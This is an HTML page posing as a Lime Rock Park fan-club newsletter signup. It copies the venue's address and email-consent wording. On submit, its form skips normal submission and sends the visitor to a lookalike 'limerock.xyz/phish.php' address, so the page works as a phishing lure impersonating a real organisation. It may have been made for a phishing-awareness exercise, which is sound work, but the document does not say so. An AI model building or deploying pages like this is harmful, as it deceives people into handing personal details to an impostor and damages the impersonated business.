<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Lime Rock Styled Form</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: Arial, sans-serif;
      background: url('https://robbreport.com/wp-content/uploads/2013/07/p17tfeo2n6noj19rr13tk1pvl78ja1.jpg') center center fixed;
      background-size: cover;
      background-repeat: no-repeat;
      background-color: #000;
    }

    .navbar {
      background-color: #000;
      color: white;
      padding: 15px 40px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .nav-center {
      display: flex;
      flex: 1;
      justify-content: center;
      gap: 50px;
      font-weight: bold;
      font-size: 14px;
    }

    .nav-right {
      font-size: 18px;
      cursor: pointer;
    }

    .form-wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      padding-top: 40px;
    }

    .form-box {
      background-color: white;
      padding: 40px;
      border-radius: 10px;
      width: 500px;
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
    }

    .form-box h2 {
      margin-top: 0;
      font-size: 22px;
    }

    .form-box label {
      display: block;
      font-weight: bold;
      margin-top: 15px;
      margin-bottom: 5px;
    }

    .form-box input[type="text"],
    .form-box input[type="email"] {
      width: 100%;
      padding: 10px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    .form-box button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      font-size: 16px;
      font-weight: bold;
      background-color: black;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .form-box button:hover {
      background-color: #333;
    }

    .form-box p.small {
      font-size: 11px;
      margin-top: 15px;
      color: #333;
    }

    .form-box p.small a {
      color: #000;
    }
  </style>
</head>
<body>

  <div class="navbar">
    <div class="nav-center">
      <div>MENU</div>
      <div>TICKETS</div>
      <div>MERCH</div>
    </div>
    <div class="nav-right">🔍</div>
  </div>

  <div class="form-wrapper">
    <div class="form-box">
      <h2>Get updated on all things Lime Rock Park!</h2>
      <p>Fill out the form below to be added to our Fan Club Newsletter!</p>

      <form onsubmit="event.preventDefault(); window.location.href='https://limerock.xyz/phish.php';">
        <label for="email">* Email</label>
        <input type="email" id="email" name="email">

        <label for="fname">* First Name</label>
        <input type="text" id="fname" name="fname">

        <label for="lname">* Last Name</label>
        <input type="text" id="lname" name="lname">

        <label for="zip">* Postal Code</label>
        <input type="text" id="zip" name="zip">

        <p class="small">
          By submitting this form, you are consenting to receive marketing emails from: Lime Rock Park, 60 White Hollow Road, Lakeville, CT, 06039, US. 
          You can revoke your consent to receive emails at any time by using the SafeUnsubscribe® link, found at the bottom of every email. 
          Emails are serviced by Constant Contact. <a href="#">Our Privacy Policy</a>.
        </p>

        <button type="submit">Sign me up!</button>
      </form>
    </div>
  </div>

</body>
</html>

